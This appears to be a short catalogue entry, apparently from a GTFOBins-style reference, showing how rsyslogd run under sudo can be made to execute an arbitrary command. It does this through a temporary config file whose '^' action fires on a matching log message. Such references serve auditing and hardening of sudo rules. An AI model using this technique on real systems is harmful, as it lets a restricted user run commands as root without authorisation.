title: rsyslogd
html:
rsyslogd

Command Execution

Context: sudo

cat >/path/to/temp-file <<EOF
module(load="imuxsock")
:msg, contains, "somerandomstring" ^/path/to/command
EOF

rsyslogd -f /path/to/temp-file
excerpt: rsyslogd Command Execution Context: sudo cat >/path/to/temp-file <<EOF module(load="imuxsock") :msg, contains, "somerandomstring" ^/path/to/command EOF rsyslogd -f /path/t
